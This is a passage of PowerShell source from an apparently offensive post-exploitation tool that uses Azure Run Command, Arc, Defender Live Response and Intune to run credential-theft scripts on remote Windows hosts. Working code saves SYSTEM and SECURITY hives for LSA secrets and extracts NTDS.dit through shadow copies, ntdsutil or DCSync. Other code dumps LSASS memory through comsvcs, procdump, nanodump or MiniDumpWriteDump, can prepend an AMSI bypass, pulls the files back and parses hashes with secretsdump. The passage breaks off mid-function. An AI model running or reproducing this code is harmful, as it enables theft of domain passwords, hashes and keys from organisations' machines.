                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout

            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            # Intune Proactive Remediation execution
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"

            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name

            if ($intuneResult.Status -eq "Triggered") {
                # Intune is async - no immediate output
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        # Clean up output
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        # Parse results
        $parsed = Parse-DPAPIOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# LSA SECRETS EXTRACTION (NetExec --lsa equivalent)
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for LSA secrets extraction.
.DESCRIPTION
    Creates a PowerShell script that exports SYSTEM and SECURITY registry hives
    for LSA secret extraction. LSA secrets include service account passwords,
    cached domain credentials, machine account hashes, and DPAPI backup keys.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-LSAExtractionScript {
    return @'
$tempDir = "$env:TEMP\azx_lsa_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
try {
    # Export SYSTEM and SECURITY hives (LSA secrets are in SECURITY hive, bootkey in SYSTEM)
    reg.exe save HKLM\SYSTEM "$tempDir\SYSTEM" /y 2>&1 | Out-Null
    reg.exe save HKLM\SECURITY "$tempDir\SECURITY" /y 2>&1 | Out-Null

    # Verify exports succeeded
    if (-not (Test-Path "$tempDir\SYSTEM") -or -not (Test-Path "$tempDir\SECURITY")) {
        Write-Output "---ERROR---"
        Write-Output "Failed to export registry hives - requires SYSTEM privileges"
        return
    }

    # Base64 encode for transfer
    $system = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SYSTEM"))
    $security = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SECURITY"))

    # Structured output with delimiters
    Write-Output "---LSA_SYSTEM---"
    Write-Output $system
    Write-Output "---LSA_SECURITY---"
    Write-Output $security
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
} finally {
    # Cleanup
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
'@
}

<#
.SYNOPSIS
    Parse LSA extraction output and decode registry hives.
.PARAMETER Output
    Raw output from the LSA extraction script.
.PARAMETER TempDir
    Temporary directory to save decoded hives.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-LSAOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output,

        [Parameter(Mandatory = $false)]
        [string]$TempDir = "$env:TEMP\azx_lsa_$(Get-Random)"
    )

    $result = @{
        Success = $false
        Secrets = @()
        CachedDomainCreds = @()
        MachineAccountHash = $null
        DPAPIBackupKey = $null
        SYSTEMPath = $null
        SECURITYPath = $null
        RawOutput = ""
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "LSA extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

        if ($Output -match "---LSA_SYSTEM---\s*([A-Za-z0-9+/=]+)\s*---LSA_SECURITY---") {
            $systemB64 = $Matches[1].Trim()
            $systemBytes = [Convert]::FromBase64String($systemB64)
            $result.SYSTEMPath = Join-Path $TempDir "SYSTEM"
            [IO.File]::WriteAllBytes($result.SYSTEMPath, $systemBytes)
        }

        if ($Output -match "---LSA_SECURITY---\s*([A-Za-z0-9+/=]+)\s*---SUCCESS---") {
            $securityB64 = $Matches[1].Trim()
            $securityBytes = [Convert]::FromBase64String($securityB64)
            $result.SECURITYPath = Join-Path $TempDir "SECURITY"
            [IO.File]::WriteAllBytes($result.SECURITYPath, $securityBytes)
        }

        # Try to parse secrets using secretsdump if available
        $secretsdumpPath = Test-SecretsdumpAvailable
        if ($secretsdumpPath -and $result.SYSTEMPath -and $result.SECURITYPath) {
            $hashOutput = & python $secretsdumpPath -security $result.SECURITYPath -system $result.SYSTEMPath LOCAL 2>&1
            $result.RawOutput = $hashOutput | Out-String

            $inLSASecrets = $false
            $inCachedCreds = $false
            $currentSecretName = $null

            foreach ($line in $hashOutput) {
                $lineStr = "$line"

                if ($lineStr -match "^\[.\] Dumping LSA Secrets") {
                    $inLSASecrets = $true
                    $inCachedCreds = $false
                    continue
                }
                if ($lineStr -match "^\[.\] Dumping cached domain logon") {
                    $inLSASecrets = $false
                    $inCachedCreds = $true
                    continue
                }
                if ($lineStr -match "^\[.\] Cleaning up") {
                    $inLSASecrets = $false
                    $inCachedCreds = $false
                    continue
                }

                if ($inLSASecrets) {
                    # LSA secret name lines end with ':'
                    if ($lineStr -match "^(\S+):$") {
                        $currentSecretName = $Matches[1]
                    } elseif ($currentSecretName -and $lineStr.Trim()) {
                        $result.Secrets += [PSCustomObject]@{
                            Name = $currentSecretName
                            Value = $lineStr.Trim()
                        }

                        # Check for machine account hash
                        if ($currentSecretName -match '\$MACHINE\.ACC' -and $lineStr -match ":([a-fA-F0-9]{32})$") {
                            $result.MachineAccountHash = $lineStr.Trim()
                        }

                        # Check for DPAPI backup key
                        if ($currentSecretName -match "DPAPI_SYSTEM" -and $lineStr -match "dpapi_machinekey:") {
                            $result.DPAPIBackupKey = $lineStr.Trim()
                        }

                        $currentSecretName = $null
                    }
                }

                if ($inCachedCreds) {
                    # Format: domain/username:hash
                    if ($lineStr -match "^([^/]+)/([^:]+):([a-fA-F0-9:]+)") {
                        $result.CachedDomainCreds += [PSCustomObject]@{
                            Domain = $Matches[1]
                            Username = $Matches[2]
                            Hash = $Matches[3]
                        }
                    }
                }
            }
            $result.Success = $true
        } else {
            # Hives extracted but no parser available
            $result.Success = $true
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute LSA secrets extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-LSAExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "LSA"
        Success = $false
        Data = $null
        Error = $null
    }

    # LSA extraction only works on Windows
    if ($Target.OSType -ne "Windows") {
        $result.Error = "LSA extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-LSAExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-lsa-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $tempDir = "$env:TEMP\azx_lsa_$($Target.Name)_$(Get-Date -Format 'yyyyMMddHHmmss')"
        $parsed = Parse-LSAOutput -Output $output -TempDir $tempDir

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# NTDS.DIT DUMP (NetExec --ntds equivalent)
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for NTDS.dit extraction.
.DESCRIPTION
    Creates a PowerShell script that dumps the Active Directory database (NTDS.dit)
    using VSS shadow copy, ntdsutil IFM, or DSInternals DCSync methods.
.PARAMETER NTDSMethod
    Extraction method: vss (default), ntdsutil, drsuapi
.PARAMETER EnabledOnly
    Only extract enabled accounts.
.PARAMETER TargetDomainUser
    Target specific domain user.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-NTDSExtractionScript {
    param(
        [Parameter(Mandatory = $false)]
        [ValidateSet("vss", "ntdsutil", "drsuapi")]
        [string]$NTDSMethod = "vss",

        [Parameter(Mandatory = $false)]
        [switch]$EnabledOnly,

        [Parameter(Mandatory = $false)]
        [string]$TargetDomainUser
    )

    $preamble = @'
# Check if target is a Domain Controller
$isDC = $false
$ntdsService = Get-Service -Name "NTDS" -ErrorAction SilentlyContinue
if ($ntdsService -and $ntdsService.Status -eq "Running") {
    $isDC = $true
}
if (-not $isDC) {
    Write-Output "---ERROR---"
    Write-Output "Target is not a Domain Controller (NTDS service not found or not running)"
    return
}

'@

    switch ($NTDSMethod) {
        "vss" {
            $methodScript = @'
$tempDir = "$env:TEMP\azx_ntds_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
try {
    # Create VSS shadow copy
    $vssResult = (cmd.exe /c "vssadmin create shadow /for=C:" 2>&1) | Out-String
    if ($vssResult -match "Shadow Copy Volume Name\s*:\s*(\\\\[^\s]+)") {
        $shadowPath = $Matches[1]
    } else {
        Write-Output "---ERROR---"
        Write-Output "Failed to create VSS shadow copy: $vssResult"
        return
    }

    # Copy NTDS.dit and SYSTEM from shadow
    $ntdsSource = "${shadowPath}\Windows\NTDS\ntds.dit"
    $systemSource = "${shadowPath}\Windows\System32\config\SYSTEM"

    cmd.exe /c "copy `"$ntdsSource`" `"$tempDir\ntds.dit`"" 2>&1 | Out-Null
    cmd.exe /c "copy `"$systemSource`" `"$tempDir\SYSTEM`"" 2>&1 | Out-Null

    if (-not (Test-Path "$tempDir\ntds.dit") -or -not (Test-Path "$tempDir\SYSTEM")) {
        Write-Output "---ERROR---"
        Write-Output "Failed to copy NTDS.dit or SYSTEM from shadow copy"
        return
    }

    $ntdsSize = (Get-Item "$tempDir\ntds.dit").Length
    $systemSize = (Get-Item "$tempDir\SYSTEM").Length

    Write-Output "---NTDS_STAGED---"
    Write-Output "NTDS_PATH:$tempDir\ntds.dit"
    Write-Output "NTDS_SIZE:$ntdsSize"
    Write-Output "SYSTEM_PATH:$tempDir\SYSTEM"
    Write-Output "SYSTEM_SIZE:$systemSize"
    Write-Output "---SUCCESS---"

    # Note: Files left in temp for staged retrieval via Receive-VMFile
    # Cleanup of shadow copy
    $shadowId = if ($vssResult -match "Shadow Copy ID\s*:\s*(\{[^\}]+\})") { $Matches[1] } else { $null }
    if ($shadowId) {
        cmd.exe /c "vssadmin delete shadows /shadow=$shadowId /quiet" 2>&1 | Out-Null
    }
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
}
'@
        }

        "ntdsutil" {
            $methodScript = @'
$tempDir = "$env:TEMP\azx_ntds_$(Get-Random)"
try {
    $ntdsResult = cmd.exe /c "ntdsutil `"activate instance ntds`" `"ifm`" `"create full $tempDir`" `"quit`" `"quit`"" 2>&1 | Out-String

    $ntdsPath = "$tempDir\Active Directory\ntds.dit"
    $systemPath = "$tempDir\registry\SYSTEM"

    if (-not (Test-Path $ntdsPath) -or -not (Test-Path $systemPath)) {
        Write-Output "---ERROR---"
        Write-Output "ntdsutil IFM creation failed: $ntdsResult"
        return
    }

    $ntdsSize = (Get-Item $ntdsPath).Length
    $systemSize = (Get-Item $systemPath).Length

    Write-Output "---NTDS_STAGED---"
    Write-Output "NTDS_PATH:$ntdsPath"
    Write-Output "NTDS_SIZE:$ntdsSize"
    Write-Output "SYSTEM_PATH:$systemPath"
    Write-Output "SYSTEM_SIZE:$systemSize"
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
}
'@
        }

        "drsuapi" {
            $userFilter = ""
            if ($TargetDomainUser) {
                $userFilter = " -SamAccountName '$TargetDomainUser'"
            }
            $enabledFilter = ""
            if ($EnabledOnly) {
                $enabledFilter = ' | Where-Object { $_.Enabled -eq $true }'
            }

            $methodScript = @"
try {
    # Check if DSInternals module is available
    if (-not (Get-Module -ListAvailable -Name DSInternals)) {
        Write-Output "---ERROR---"
        Write-Output "DSInternals module not installed. Install with: Install-Module DSInternals"
        return
    }
    Import-Module DSInternals -ErrorAction Stop

    `$dc = (Get-ADDomainController -Discover).HostName[0]
    `$domain = (Get-ADDomain).DistinguishedName

    Write-Output "---NTDS_HASHES---"
    `$accounts = Get-ADReplAccount -All -Server `$dc -NamingContext `$domain${userFilter}${enabledFilter}
    foreach (`$acct in `$accounts) {
        `$username = `$acct.SamAccountName
        `$rid = `$acct.Sid.Value.Split('-')[-1]
        `$ntHash = if (`$acct.NTHash) { (`$acct.NTHash | ForEach-Object { `$_.ToString('x2') }) -join '' } else { 'aad3b435b51404ee' }
        `$lmHash = 'aad3b435b51404ee'
        Write-Output "`${username}:`${rid}:`${lmHash}:`${ntHash}:::"
    }
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output `$_.Exception.Message
}
"@
        }
    }

    return $preamble + $methodScript
}

<#
.SYNOPSIS
    Parse NTDS extraction output.
.PARAMETER Output
    Raw output from the NTDS extraction script.
.PARAMETER EnabledOnly
    Filter for enabled accounts only.
.PARAMETER TargetDomainUser
    Filter for specific user.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-NTDSOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output,

        [Parameter(Mandatory = $false)]
        [switch]$EnabledOnly,

        [Parameter(Mandatory = $false)]
        [string]$TargetDomainUser
    )

    $result = @{
        Success = $false
        Hashes = @()
        StagedFiles = @()
        RequiresFileTransfer = $false
        LocalPath = $null
        RawHashes = ""
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "NTDS extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        # Check if inline hashes (drsuapi method)
        if ($Output -match "---NTDS_HASHES---") {
            $hashSection = ($Output -split "---NTDS_HASHES---")[1]
            $hashSection = ($hashSection -split "---SUCCESS---")[0]

            foreach ($line in ($hashSection -split "`n")) {
                $line = $line.Trim()
                if ($line -match "^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$") {
                    $username = $Matches[1]

                    # Apply user filter
                    if ($TargetDomainUser -and $username -ne $TargetDomainUser) { continue }

                    $result.Hashes += [PSCustomObject]@{
                        Username = $username
                        RID = $Matches[2]
                        LMHash = $Matches[3]
                        NTHash = $Matches[4]
                        HashLine = $line
                    }
                }
            }
            $result.RawHashes = ($result.Hashes | ForEach-Object { $_.HashLine }) -join "`n"
            $result.Success = $true
        }

        # Check if staged files (vss/ntdsutil method)
        if ($Output -match "---NTDS_STAGED---") {
            $result.RequiresFileTransfer = $true
            $stagedSection = ($Output -split "---NTDS_STAGED---")[1]
            $stagedSection = ($stagedSection -split "---SUCCESS---")[0]

            foreach ($line in ($stagedSection -split "`n")) {
                $line = $line.Trim()
                if ($line -match "^(NTDS_PATH|SYSTEM_PATH):(.+)$") {
                    $type = $Matches[1]
                    $path = $Matches[2].Trim()
                    $sizeLine = ($stagedSection -split "`n") | Where-Object { $_ -match "^${type -replace '_PATH','_SIZE'}:(\d+)" }
                    $size = if ($sizeLine -and $sizeLine -match ":(\d+)") { [math]::Round([int64]$Matches[1] / 1MB, 2).ToString() + " MB" } else { "unknown" }

                    $result.StagedFiles += [PSCustomObject]@{
                        Type = $type -replace "_PATH", ""
                        Path = $path
                        Size = $size
                    }
                }
            }
            $result.Success = $true
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute NTDS.dit extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER NTDSMethod
    Extraction method: vss, ntdsutil, drsuapi.
.PARAMETER EnabledOnly
    Only extract enabled accounts.
.PARAMETER TargetDomainUser
    Target specific domain user.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-NTDSExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [ValidateSet("vss", "ntdsutil", "drsuapi")]
        [string]$NTDSMethod = "vss",

        [Parameter(Mandatory = $false)]
        [switch]$EnabledOnly,

        [Parameter(Mandatory = $false)]
        [string]$TargetDomainUser,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "NTDS"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "NTDS extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-NTDSExtractionScript -NTDSMethod $NTDSMethod -EnabledOnly:$EnabledOnly -TargetDomainUser $TargetDomainUser

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-ntds-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-NTDSOutput -Output $output -EnabledOnly:$EnabledOnly -TargetDomainUser $TargetDomainUser

        # Handle staged file transfer for vss/ntdsutil methods
        if ($parsed.RequiresFileTransfer -and $parsed.StagedFiles.Count -gt 0) {
            Write-ColorOutput -Message "    [*] NTDS.dit requires file transfer (too large for inline)..." -Color "Yellow"

            $localDir = "$env:TEMP\azx_ntds_$($Target.Name)_$(Get-Date -Format 'yyyyMMddHHmmss')"
            New-Item -ItemType Directory -Path $localDir -Force | Out-Null

            foreach ($staged in $parsed.StagedFiles) {
                $localFile = Join-Path $localDir (Split-Path $staged.Path -Leaf)
                Write-ColorOutput -Message "    [*] Downloading $($staged.Type): $($staged.Path) ($($staged.Size))..." -Color "Cyan"

                if ($Target.Type -eq "AzureVM") {
                    $transferResult = Receive-VMFile -VMName $Target.Name `
                        -ResourceGroup $Target.ResourceGroup `
                        -OSType $Target.OSType `
                        -RemotePath $staged.Path `
                        -LocalPath $localFile `
                        -MaxFileSizeMB 500
                    if ($transferResult.Success) {
                        Write-ColorOutput -Message "    [+] Downloaded to: $localFile" -Color "Green"
                    } else {
                        Write-ColorOutput -Message "    [!] Transfer failed: $($transferResult.Error)" -Color "Red"
                    }
                } elseif ($Target.Type -eq "Arc") {
                    $transferResult = Receive-DeviceFile -MachineName $Target.Name `
                        -ResourceGroup $Target.ResourceGroup `
                        -Location $Target.Location `
                        -OSType $Target.OSType `
                        -RemotePath $staged.Path `
                        -LocalPath $localFile `
                        -MaxFileSizeMB 500
                    if ($transferResult.Success) {
                        Write-ColorOutput -Message "    [+] Downloaded to: $localFile" -Color "Green"
                    } else {
                        Write-ColorOutput -Message "    [!] Transfer failed: $($transferResult.Error)" -Color "Red"
                    }
                }
            }

            # Try to parse locally with secretsdump
            $ntdsLocal = Join-Path $localDir "ntds.dit"
            $systemLocal = Join-Path $localDir "SYSTEM"
            $secretsdumpPath = Test-SecretsdumpAvailable

            if ($secretsdumpPath -and (Test-Path $ntdsLocal) -and (Test-Path $systemLocal)) {
                Write-ColorOutput -Message "    [*] Parsing NTDS.dit with secretsdump.py..." -Color "Cyan"
                $hashOutput = & python $secretsdumpPath -ntds $ntdsLocal -system $systemLocal LOCAL 2>&1
                $parsed.RawHashes = $hashOutput | Out-String

                foreach ($line in $hashOutput) {
                    if ("$line" -match "^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$") {
                        $username = $Matches[1]
                        if ($TargetDomainUser -and $username -ne $TargetDomainUser) { continue }

                        $parsed.Hashes += [PSCustomObject]@{
                            Username = $username
                            RID = $Matches[2]
                            LMHash = $Matches[3]
                            NTHash = $Matches[4]
                            HashLine = "$line"
                        }
                    }
                }
            }

            $parsed.LocalPath = $localDir
        }

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# LSASS MEMORY DUMP (NetExec -M lsassy equivalent)
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for LSASS memory dump.
.DESCRIPTION
    Creates a PowerShell script that dumps LSASS process memory for offline
    credential extraction. Supports multiple dump methods.
.PARAMETER LsassMethod
    Dump method: comsvcs (default), procdump, nanodump, direct
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-LSASSExtractionScript {
    param(
        [Parameter(Mandatory = $false)]
        [ValidateSet("comsvcs", "procdump", "nanodump", "direct")]
        [string]$LsassMethod = "comsvcs"
    )

    $preamble = @'
$tempDir = "$env:TEMP\azx_lsass_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$dumpPath = "$tempDir\lsass.dmp"

# Get LSASS PID
$lsassProc = Get-Process -Name lsass -ErrorAction SilentlyContinue
if (-not $lsassProc) {
    Write-Output "---ERROR---"
    Write-Output "LSASS process not found"
    return
}
$lsassPID = $lsassProc.Id

'@

    switch ($LsassMethod) {
        "comsvcs" {
            $methodScript = @'
try {
    # Use comsvcs.dll MiniDump via rundll32
    $comsvcsResult = & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $dumpPath full 2>&1
    Start-Sleep -Seconds 2

    if (-not (Test-Path $dumpPath)) {
        Write-Output "---ERROR---"
        Write-Output "comsvcs.dll MiniDump failed - Credential Guard may be active"
        return
    }

    $dumpSize = (Get-Item $dumpPath).Length
    Write-Output "---LSASS_STAGED---"
    Write-Output "DUMP_PATH:$dumpPath"
    Write-Output "DUMP_SIZE:$dumpSize"
    Write-Output "DUMP_METHOD:comsvcs"
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
}
'@
        }

        "procdump" {
            $methodScript = @'
try {
    # Check for procdump
    $procdumpPath = Get-Command "procdump.exe" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source
    if (-not $procdumpPath) {
        $procdumpPath = "C:\Tools\procdump.exe"
    }
    if (-not (Test-Path $procdumpPath)) {
        Write-Output "---ERROR---"
        Write-Output "procdump.exe not found on target"
        return
    }

    & $procdumpPath -accepteula -ma $lsassPID $dumpPath 2>&1 | Out-Null
    Start-Sleep -Seconds 2

    if (-not (Test-Path $dumpPath)) {
        Write-Output "---ERROR---"
        Write-Output "procdump failed to create LSASS dump"
        return
    }

    $dumpSize = (Get-Item $dumpPath).Length
    Write-Output "---LSASS_STAGED---"
    Write-Output "DUMP_PATH:$dumpPath"
    Write-Output "DUMP_SIZE:$dumpSize"
    Write-Output "DUMP_METHOD:procdump"
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
}
'@
        }

        "nanodump" {
            $methodScript = @'
try {
    $nanodumpPath = Get-Command "nanodump.exe" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source
    if (-not $nanodumpPath) {
        $nanodumpPath = "C:\Tools\nanodump.exe"
    }
    if (-not (Test-Path $nanodumpPath)) {
        Write-Output "---ERROR---"
        Write-Output "nanodump.exe not found on target"
        return
    }

    & $nanodumpPath --write $dumpPath 2>&1 | Out-Null
    Start-Sleep -Seconds 2

    if (-not (Test-Path $dumpPath)) {
        Write-Output "---ERROR---"
        Write-Output "nanodump failed to create LSASS dump"
        return
    }

    $dumpSize = (Get-Item $dumpPath).Length
    Write-Output "---LSASS_STAGED---"
    Write-Output "DUMP_PATH:$dumpPath"
    Write-Output "DUMP_SIZE:$dumpSize"
    Write-Output "DUMP_METHOD:nanodump"
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
}
'@
        }

        "direct" {
            $methodScript = @'
try {
    # P/Invoke MiniDumpWriteDump from dbghelp.dll
    $signature = @"
[DllImport("dbghelp.dll", SetLastError = true)]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess,
    uint ProcessId,
    IntPtr hFile,
    uint DumpType,
    IntPtr ExceptionParam,
    IntPtr UserStreamParam,
    IntPtr CallbackParam);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(
    uint processAccess,
    bool bInheritHandle,
    int processId);
"@

    Add-Type -MemberDefinition $signature -Name "DbgHelp" -Namespace "Win32" -ErrorAction Stop

    $processHandle = [Win32.DbgHelp]::OpenProcess(0x001F0FFF, $false, $lsassPID)
    if ($processHandle -eq [IntPtr]::Zero) {
        Write-Output "---ERROR---"
